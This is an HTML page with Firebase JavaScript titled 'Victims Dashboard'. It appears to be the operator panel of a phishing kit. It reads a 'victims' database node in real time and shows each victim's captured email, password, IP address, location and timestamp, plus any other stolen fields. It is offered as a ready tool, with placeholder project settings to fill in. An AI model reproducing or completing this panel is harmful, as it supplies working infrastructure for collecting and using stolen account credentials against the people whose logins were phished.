<!DOCTYPE html>
<html>
<head>
    <title>Victims Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js"></script>
    <style>
        body { font-family: Arial; background: #f2f2f2; }
        .card { background: white; padding: 15px; margin: 15px; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
        .flag { height: 20px; vertical-align: middle; }
    </style>
</head>
<body>
    <h2>📋 Victims Dashboard</h2>
    <div id="victimsList"></div>

    <script>
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT.firebaseapp.com",
            databaseURL: "https://YOUR_PROJECT.firebaseio.com",
            projectId: "YOUR_PROJECT",
            storageBucket: "YOUR_PROJECT.appspot.com",
            messagingSenderId: "SENDER_ID",
            appId: "APP_ID"
        };
        const app = firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        db.ref('victims').on('value', (snapshot) => {
            const data = snapshot.val();
            let output = "";

            for (let id in data) {
                let v = data[id];
                output += `
                    <div class="card">
                        📧 <b>Email:</b> ${v.email || ''} <br>
                        🔑 <b>Password:</b> ${v.password || ''} <br>
                        🌐 <b>IP:</b> ${v.ip || ''} <br>
                        📍 <b>Location:</b> ${v.country || ''} <img class="flag" src="${v.flag || ''}"> <br>
                        🕒 <b>Time:</b> ${v.time || ''} — ${v.date || ''} <br><br>
                        <hr>
                        <b>Other Details:</b><br>
                        ${Object.entries(v)
                            .filter(([k]) => !['email','password','ip','country','flag','time','date'].includes(k))
                            .map(([key,value]) => `<b>${key}:</b> ${value}<br>`).join('')}
                    </div>
                `;
            }

            document.getElementById('victimsList').innerHTML = output;
        });
    </script>
</body>
</html>
